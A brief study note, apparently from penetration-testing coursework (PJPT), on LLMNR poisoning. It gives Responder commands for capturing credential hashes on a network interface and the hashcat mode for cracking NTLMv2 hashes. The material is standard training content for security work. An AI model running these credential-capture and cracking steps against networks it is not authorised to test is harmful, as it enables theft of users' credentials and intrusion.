Starting responder with default settings
- for LLMNR poisoning, turn rogue servers (SMB, HTTP) off
```JavaScript
sudo responder -I <interface>
```
  
Running responder with settings from PJPT
```JavaScript
sudo responder -I <interface> -dP
```
![[../../assets/From Linux/image 354.png|image 354.png]]
![[../../assets/From Linux/image 1 262.png|image 1 262.png]]
  
hashcat mode for NTLMv2 is -m 5600